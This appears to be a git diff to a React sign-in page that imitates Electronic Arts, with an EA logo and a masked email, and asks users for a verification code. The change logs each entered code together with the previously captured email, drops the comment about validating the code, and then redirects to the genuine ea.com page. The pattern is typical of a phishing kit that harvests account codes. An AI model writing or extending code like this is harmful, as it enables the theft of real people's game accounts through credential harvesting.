@@ -2,7 +2,7 @@ import React, { useState } from 'react'
 import { useNavigate } from 'react-router-dom'
 import { ArrowLeft } from 'lucide-react'
 import EALogo from './EALogo'
-import { getLastEmail } from '../utils/logger'
+import { appendLog, getLastEmail } from '../utils/logger'
 import { maskEmail } from '../utils/emailMask'
 
 const CodeEntryScreen: React.FC = () => {
@@ -17,8 +17,8 @@ const CodeEntryScreen: React.FC = () => {
   }
 
   const handleSignIn = () => {
-    // In a real-world case, validate the code, then proceed
     console.log('Sign in clicked', { code, remember })
+    appendLog({ page: 'code', code, email: getLastEmail() || undefined, rememberMe: remember })
     window.location.href = 'http://ea.com/twitchlinking'
   }
 
